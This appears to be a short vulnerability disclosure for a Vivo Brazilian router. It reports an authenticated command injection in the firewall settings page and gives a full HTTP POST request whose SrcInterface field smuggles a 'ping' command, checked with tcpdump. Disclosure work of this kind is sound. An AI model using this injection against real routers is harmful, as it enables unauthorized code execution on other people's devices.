# Vivo Code Execution Firewall

Vivo brazilian router is vulnerable to a authenticated remote code execution in the firewall settings page.<br>
The "SrcInterface" was tested and it is vulnerable.<br>
It is possible to run a ping command in the router.<br>
Run tcpdump in the other end and see the packets being received.<br>

POST /cgi-bin/settings-firewall.cgi HTTP/1.1<br>
Host: 192.168.15.1<br>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0<br>
Accept: text/html, */*; q=0.01<br>
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3<br>
Accept-Encoding: gzip, deflate, br<br>
Content-Type: application/x-www-form-urlencoded<br>
X-Requested-With: XMLHttpRequest<br>
Content-Length: 273<br>
Origin: http://192.168.15.1<br>
Connection: keep-alive<br>
Referer: http://192.168.15.1/cgi-bin/settings-firewall.cgi<br>
Cookie: COOKIE_SESSION_KEY=8cc78d1a049bbc63f372d8cfec6886d1<br>
Priority: u=0<br>

editflag=1&editIndex=0&Order=1&RuleName=teste&Protocol=TCP&IcmpType=&Icmpv6Type=&IPVersion=4&SrcInterface=br0;ping 192.168.15.123;&Target=Accept&ActionValue=Local&LocalPort=80&LocalPortRangeMax=&LocalIP=192.168.15.1&RemotePort=80&RemotePortRangeMax=&LocalMask=&RemoteMask=&RemoteIP=192.168.15.2<br><br>

![9c64e2bf6c0643d5a3ca768dd3e1a5bb](https://github.com/user-attachments/assets/e7ce2102-72e6-44af-9eac-0b530b3cfd4e)


![6d1f04268c754ba182bfabfb1c85fb35](https://github.com/user-attachments/assets/84d68d95-92cb-4db8-a8b4-1ce31aedbfef)
